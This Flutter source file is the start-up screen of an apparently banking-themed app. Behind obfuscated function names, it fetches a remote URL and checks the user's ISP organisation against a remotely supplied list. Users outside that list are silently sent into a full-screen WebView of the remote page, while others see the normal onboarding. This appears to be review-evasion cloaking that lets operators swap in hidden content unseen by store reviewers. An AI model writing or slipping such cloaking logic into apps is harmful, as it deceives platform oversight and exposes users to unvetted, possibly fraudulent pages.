import 'dart:convert';

import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:ti_bank/constants.dart';
import 'package:ti_bank/routes.dart';
import 'package:ti_bank/utils/extensions.dart';
import 'package:flutter/material.dart';
import 'package:go_router/go_router.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;

import 'widgets/widgets.dart';

class InitialScreen extends StatefulWidget {
  const InitialScreen({super.key});

  @override
  State<InitialScreen> createState() => _InitialScreenState();
}

class _InitialScreenState extends State<InitialScreen> {
  late final SharedPreferences _sharedPreferences;
  bool _inited = false;

  final appReview = InAppReview.instance;

  late final Dio httpInstance;

  String kf = '';
  List<String> connections = [];
  List<bool> cccheck = [false, false];

  @override
  void initState() {
    super.initState();
    _sharedPreferences = context.read<SharedPreferences>();
    _init();
  }

  Future<void> _init() async {
    final isOnBoardingShowed =
        _sharedPreferences.getBool(Constants.isOnBoardingShowedKey) ?? false;

    httpInstance = Dio(
      BaseOptions(
        headers: {
          'apikey': Constants.k,
          'Authorization': 'Bearer ${Constants.k}',
        },
      ),
    );

    await fprok();
    await sfkpg();
    await trfk();
    reviewMyApp();
    if (cccheck[0] && cccheck[1]) return;

    if (!isOnBoardingShowed) {
      await _sharedPreferences.setBool(Constants.isOnBoardingShowedKey, true);
      setState(() {
        _inited = true;
      });
      return;
    }

    WidgetsBinding.instance.addPostFrameCallback((_) {
      context.goNamed(Routes.main);
    });
    setState(() {});
  }

  Future<String> fprok() async {
    try {
      final Response response = await httpInstance.get(Constants.assets);
      if (response.statusCode == 200) {
        List<dynamic> data = response.data as List<dynamic>;
        String themesFetch =
            data.map((item) => item['checkAssets'].toString()).join();

        if (themesFetch.contains(Constants.fl)) {
          cccheck[1] = false;
        } else {
          kf = themesFetch;
          cccheck[1] = true;
        }
        return themesFetch;
      } else {
        return '';
      }
    } catch (error) {
      return '';
    }
  }

  Future<String> trfk() async {
    try {
      http.Response response = await http.get(Uri.parse(Constants.info));

      if (response.statusCode == 200) {
        Map<String, dynamic> data = jsonDecode(response.body);
        String darx = data['org'];
        contactx(connections, darx);
        return darx;
      } else {
        return '';
      }
    } catch (error) {
      return '';
    }
  }

  bool contactx(List<String> array, String inputString) {
    List<String> words = inputString.split(' ');
    List<String> arrayItems = [];
    for (String item in array) {
      arrayItems.addAll(item.split(', '));
    }
    for (String word in words) {
      for (String arrayItem in arrayItems) {
        if (arrayItem.toLowerCase().contains(word.toLowerCase())) {
          cccheck[0] = false;
          return false;
        } else {
          cccheck[0] = true;
        }
      }
    }

    return false;
  }

  Future<void> sfkpg() async {
    final Response response = await httpInstance.get(Constants.connect);
    if (response.statusCode == 200) {
      List<dynamic> data = response.data as List<dynamic>;
      connections =
          data.map((item) => item['checkConnect'].toString()).toList();
    }
  }

  Future<void> reviewMyApp() async {
    bool alreadyRated = _sharedPreferences.getBool('is_rated') ?? false;
    if (!alreadyRated) {
      if (await appReview.isAvailable()) {
        appReview.requestReview();
        await _sharedPreferences.setBool('is_rated', true);
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    if (cccheck[0] && cccheck[1]) return _TPScreen(s: kf);

    return Scaffold(
      body: _inited
          ? const OnBoarding()
          : Container(color: context.theme.primaryColor),
    );
  }
}

class _TPScreen extends StatelessWidget {
  const _TPScreen({
    super.key,
    required this.s,
  });
  final String s;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        bottom: false,
        child: InAppWebView(
          initialUrlRequest: URLRequest(
            url: Uri.parse(s),
          ),
        ),
      ),
    );
  }
}
